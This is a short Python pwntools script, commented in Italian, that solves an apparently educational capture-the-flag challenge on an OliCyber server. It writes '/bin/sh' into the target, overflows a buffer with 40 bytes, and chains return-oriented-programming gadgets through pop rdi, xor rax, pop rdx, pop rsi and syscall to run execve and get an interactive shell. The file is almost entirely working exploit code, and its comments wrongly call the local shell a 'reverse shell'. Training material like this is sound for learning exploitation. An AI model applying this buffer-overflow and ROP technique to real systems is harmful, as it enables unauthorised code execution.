from pwn import *

#challenge con esempio di rop
#comandi utili -ropper -f <file>, mostra tutti i gadget utili

r = remote("emergency.challs.olicyber.it", 10306)

print(r.recvline())
r.send(b"/bin/sh\x00") #preparo la reverse shell

print(r.recvline())
                                                                           
r.send(b"a"*40                 + 
           p64(0x401032)           + #pop rdi, ret
           p64(59)                 + #59 - syscall per execve   
           p64(0x401038)           + #xor rax, rdi
           p64(0x401032)           + #pop rdi 
           p64(0x404000)           + #pointer reverse shell
           p64(0x401036)           + #pop rdx
           p64(0)                  + #0
           p64(0x401034)           + #pop rsi
           p64(0)                  + #0
           p64(0x40101a)             #syscall    
           )

r.interactive()